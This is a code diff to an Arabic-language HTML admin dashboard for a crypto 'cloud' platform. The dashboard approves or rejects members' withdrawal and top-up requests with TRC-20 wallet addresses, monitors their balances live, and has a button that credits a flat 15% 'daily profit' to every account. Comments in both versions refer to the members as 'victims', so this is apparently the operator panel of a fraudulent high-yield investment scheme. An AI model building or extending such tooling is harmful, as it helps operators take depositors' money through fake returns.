@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>لوحة تحكم وإدارة المنظومة السحابية 💻</title>
+    <title>لوحة تحكم وإدارة المنظومة السحابية MÜŞERREF 💻</title>
     <style>
         body {
             background-color: #0B1425;
@@ -13,7 +13,7 @@
             margin: 0;
         }
         .admin-container {
-            max-width: 900px;
+            max-width: 950px;
             margin: 0 auto;
         }
         .header-panel {
@@ -106,38 +106,38 @@
 
 <div class="admin-container">
     
-    <!-- القسم العلوي وإجمالي عدد المشتركين -->
+    <!-- القسم العلوي المعدل وعداد الأعضاء الحقيقي -->
     <div class="header-panel">
         <h2>💻 لوحة تحكم وإدارة المنظومة السحابية</h2>
         <div class="counter-box">
-            👥 إجمالي عدد الأعضاء المسجلين: <span id="total-users-count" style="color: #22C55E;">0</span>
+            👥 إجمالي عدد الأعضاء المسجلين حالياً: <span id="total-users-count" style="color: #22C55E;">0</span>
         </div>
     </div>
 
-    <!-- زر الإجراءات الجماعية اليومية للربح المباشر بنسبة 15% -->
-    <button class="btn-distribute" onclick="distributeDailyProfit()">⚙️ الإجراءات الجماعية اليومية: توزيع الأرباح المباشرة للمجموعات (%15) 💰</button>
+    <!-- زر توزيع الأرباح الفوري والمعدل بنسبة 15% -->
+    <button class="btn-distribute" onclick="distributeDailyProfit()">⚙️ الإجراءات الجماعية اليومية: توزيع الأرباح المباشرة للمجموعات المستهدفة (%15) 💰</button>
 
-    <!-- الجدول الأول: طلبات المستخدمين المعلقة -->
-    <span class="section-title">📥 طلبات الأعضاء المعلقة في انتظار المراجعة</span>
+    <!-- الجدول الأول: طلبات السحب والشحن القادمة من الواجهات الجديدة -->
+    <span class="section-title">📥 طلبات الأعضاء المعلقة والواردة حياً (سحب / شحن رصيد)</span>
     <table>
         <thead>
             <tr>
                 <th>اسم المستخدم</th>
-                <th>نوع الطلب</th>
-                <th>المبلغ / التفاصيل</th>
-                <th>عنوان المحفظة المستلمة</th>
-                <th>قرار المشرف المباشر</th>
+                <th>نوع الإجراء السحابي</th>
+                <th>المبلغ المطلوب / التفاصيل</th>
+                <th>عنوان محفظة المستلم (TRC-20)</th>
+                <th>إجراء المشرف الفوري</th>
             </tr>
         </thead>
         <tbody id="requests-table-body">
             <tr>
-                <td colspan="5" class="no-data">لا توجد أي طلبات معلقة حالياً...</td>
+                <td colspan="5" class="no-data">في انتظار بث أي طلبات سحب أو شحن جديدة من المستخدمين...</td>
             </tr>
         </tbody>
     </table>
 
-    <!-- الجدول الثاني: مراقبة الأرصدة الحية للأعضاء -->
-    <span class="section-title">📊 المراقبة الحية والمباشرة لأرصدة وحسابات الأعضاء</span>
+    <!-- الجدول الثاني: المراقبة الدائمة لأرصدة الضحايا والمشتركين -->
+    <span class="section-title">📊 المراقبة الحية والكاملة لبيانات وأرصدة حسابات الأعضاء</span>
     <table>
         <thead>
             <tr>
@@ -150,17 +150,18 @@
         </thead>
         <tbody id="users-table-body">
             <tr>
-                <td colspan="5" class="no-data">لم يقم أي عضو بتسجيل الدخول بعد...</td>
+                <td colspan="5" class="no-data">لم يقم أي عضو بتسجيل دخوله وتثبيت اسمه حتى الآن...</td>
             </tr>
         </tbody>
     </table>
 
 </div>
 
+<!-- السكربت المطور للربط الشامل والبث الفوري المستمر -->
 <script>
-    // دالة البث الحي لجلب البيانات من السيرفر السحابي وتحديث الجداول تلقائياً كل ثانيتين
+    // دالة التحديث التلقائي المستمر كل ثانيتين للجداول
     function fetchDashboardData() {
-        // 1. جلب وتحديث جدول طلبات السحب والشحن والمعاملات المعلقة
+        // 1. تحديث جدول طلبات السحب والإيداع الواردة حياً
         fetch('/api/admin/requests')
         .then(res => res.json())
         .then(requests => {
@@ -186,9 +187,9 @@
                 `;
             });
         })
-        .catch(err => console.error("خطأ أثناء جلب طلبات الأعضاء المعلقة:", err));
+        .catch(err => console.error("خطأ برمي أثناء تحديث جدول الطلبات الواردة:", err));
 
-        // 2. جلب وتحديث جدول الأرصدة الحية ومراقبة المستخدمين الجدد
+        // 2. تحديث جدول مراقبة الأرصدة والتحكم بحسابات الأعضاء
         fetch('/api/admin/users')
         .then(res => res.json())
         .then(users => {
@@ -196,7 +197,7 @@
             document.getElementById('total-users-count').innerText = users.length;
 
             if (!users || users.length === 0) {
-                userBody.innerHTML = `<tr><td colspan="5" class="no-data">لم يقم أي عضو بتسجيل الدخول بعد.</td></tr>`;
+                userBody.innerHTML = `<tr><td colspan="5" class="no-data">لا يوجد أي أعضاء مسجلين نشطين حالياً.</td></tr>`;
                 return;
             }
 
@@ -213,10 +214,10 @@
                 `;
             });
         })
-        .catch(err => console.error("خطأ أثناء جلب بيانات أرصدة الحسابات:", err));
+        .catch(err => console.error("خطأ برمي أثناء تحديث لوحة مراقبة الأرصدة الحية:", err));
     }
 
-    // دالة اتخاذ القرار للمشرف (قبول أو رفض طلب معلق) وتعديل أرصدة الضحية تلقائياً
+    // دالة اتخاذ القرار للمشرف (موافقة / رفض للطلبات السحابية)
     function processAction(requestId, actionType) {
         fetch('/api/admin/action', {
             method: 'POST',
@@ -225,26 +226,26 @@
         })
         .then(res => res.json())
         .then(data => {
-            alert(actionType === 'onayla' ? "تمت الموافقة على طلب العضو وتحديث حساباته بنجاح!" : "تم رفض طلب العضو بنجاح.");
-            fetchDashboardData(); // تحديث فوري للجداول بعد اتخاذ القرار
+            alert(actionType === 'onayla' ? "تمت معالجة والموافقة على طلب العضو السحابي بنجاح!" : "تم رفض الطلب وإلغاء العملية.");
+            fetchDashboardData(); // تحديث فوري بعد الضغط مباشرة
         })
-        .catch(err => console.error("خطأ في معالجة طلب المشرف:", err));
+        .catch(err => console.error("خطأ في بث أمر المشرف إلى الخادم السحابي:", err));
     }
 
-    // دالة الإجراءات الجماعية لتوزيع الأرباح اليومية بنسبة 15% وتحديث سيرفر Express حياً
+    // دالة توزيع الأرباح اليومية للمجموعات بنسبة 15% حياً ومباشرة للجميع
     function distributeDailyProfit() {
         fetch('/api/admin/distribute-profits', { method: 'POST' })
         .then(res => res.json())
         .then(data => {
-            alert("تم إطلاق الإجراءات اليومية بنجاح! جاري احتساب وتوزيع الأرباح بنسبة 15% لجميع الأعضاء حياً.");
+            alert("تم إطلاق معالجة النظام اليومي الموحد حياً! جاري توزيع واحتساب الأرباح بنسبة 15% لكافة الحسابات المشتركة.");
             fetchDashboardData();
         })
-        .catch(err => console.error("خطأ أثناء توزيع الأرباح:", err));
+        .catch(err => console.error("خطأ أثناء معالجة توزيع الـ 15% للمشتركين:", err));
     }
 
-    // تشغيل نظام التحديث الآلي المستمر كل ثانيتين حياً ومباشرة
+    // بدء التحديث التلقائي الفوري كل ثانيتين طوال الوقت بدون تجمد الشاشة
     setInterval(fetchDashboardData, 2000);
-    fetchDashboardData(); // تشغيل فوري لحظة تحميل الشاشة
+    fetchDashboardData(); // تحميل البيانات فور فتح الصفحة مباشرة
 </script>
 </body>
 </html>
